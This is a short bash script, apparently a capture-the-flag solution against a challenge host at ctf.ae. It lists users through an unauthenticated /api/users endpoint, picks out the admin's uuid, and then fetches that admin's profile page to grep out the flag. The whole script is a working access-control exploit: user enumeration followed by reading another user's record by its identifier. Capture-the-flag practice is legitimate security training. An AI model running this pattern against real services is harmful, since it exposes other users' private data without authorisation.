#!/usr/bin/env bash
B="https://cefe906e882e9e1f.chal.ctf.ae"
ADMIN=$(curl -s "$B/api/users" | python3 -c 'import sys,json;print([u["uuid"] for u in json.load(sys.stdin)["users"] if u["role"]=="admin"][0])')
curl -s "$B/profile/$ADMIN" | grep -oiE 'flag\{[^}]*\}'
